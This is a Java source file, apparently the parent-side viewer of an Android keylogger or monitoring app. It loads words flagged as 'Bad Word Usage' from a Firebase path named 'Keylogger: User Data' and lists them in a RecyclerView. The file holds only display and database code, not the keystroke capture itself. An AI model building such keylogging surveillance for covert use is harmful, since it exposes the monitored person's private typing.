package com.maemresen.infsec.keyloggerParent;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.airbnb.lottie.LottieAnimationView;
import com.airbnb.lottie.LottieDrawable;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CaughtUsingBadWordsFragment extends Fragment {
    private DatabaseReference badwordsRef;
    private RecyclerView recyclerView;
    private BadWordsAdapter adapter;
    private List<String> badWordsList;
    
    private LottieAnimationView loadingAnimationView;
    private boolean isLoading;
    
    @Nullable
    @Override
    public View onCreateView( @NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState ) {
        View rootView = inflater.inflate( R.layout.badwords_detection_layout, container, false );
        
        recyclerView = rootView.findViewById( R.id.BadWordsRecycler );
        recyclerView.setLayoutManager( new LinearLayoutManager( getContext() ) );
        badWordsList = new ArrayList<>();
        adapter = new BadWordsAdapter( badWordsList );
        recyclerView.setAdapter( adapter );
        loadingAnimationView = rootView.findViewById( R.id.loadingAnimationView );
        
        // Set the animation resource
        loadingAnimationView.setAnimation( R.raw.skeleton_card );
        // Set the animation loop and start
        loadingAnimationView.setRepeatCount( LottieDrawable.INFINITE );
        loadingAnimationView.playAnimation();
        
        Date now = DateTimeHelper.getCurrentDay();
        SimpleDateFormat dateFormat = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() );
        String databaseName = dateFormat.format( now );
        String ownerName = Build.MODEL;
        badwordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Bad Word Usage" );
        
        // Add a ValueEventListener to listen for changes in the data
        badwordsRef.addValueEventListener( new ValueEventListener() {
            @Override
            public void onDataChange( @NonNull DataSnapshot dataSnapshot ) {
                badWordsList.clear();
                
                for (DataSnapshot badWordSnapshot : dataSnapshot.getChildren()) {
                    String badWord = badWordSnapshot.getValue( String.class );
                    badWordsList.add( badWord );
                }
                
                // Notify the adapter that the data has changed
                adapter.notifyDataSetChanged();
                
                isLoading = false;
                loadingAnimationView.setVisibility( View.GONE );
            }
            
            @Override
            public void onCancelled( @NonNull DatabaseError databaseError ) {
                // Handle errors that occur during data retrieval
                Log.e( "FirebaseError", "Data retrieval canceled: " + databaseError.getMessage() );
            }
            
        } );
        
        return rootView;
    }
    
    @Override
    public void onResume() {
        super.onResume();
        
        if (isLoading) {
            // Show the loading animation view
            loadingAnimationView.setVisibility( View.VISIBLE );
        } else {
            // Hide the loading animation view
            loadingAnimationView.setVisibility( View.GONE );
        }
    }
}